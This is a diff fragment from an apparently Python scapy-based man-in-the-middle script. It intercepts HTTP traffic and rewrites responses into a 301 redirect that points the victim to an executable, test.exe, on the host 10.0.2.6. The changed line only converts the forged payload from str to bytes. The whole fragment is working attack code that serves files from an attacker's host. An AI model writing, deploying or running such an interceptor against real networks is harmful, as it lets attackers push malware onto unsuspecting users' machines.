@@ -40,7 +40,7 @@ def process_packet(packet):
 			ack_list.remove(s_packet[scapy.TCP].seq)
 			print('[+] Serving custom file..')
 			
-			packet.set_payload(str(set_load(s_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http:\\10.0.2.6\\test.exe\n\n')))
+			packet.set_payload(bytes(set_load(s_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http:\\10.0.2.6\\test.exe\n\n')))
 
 	packet.accept()
 
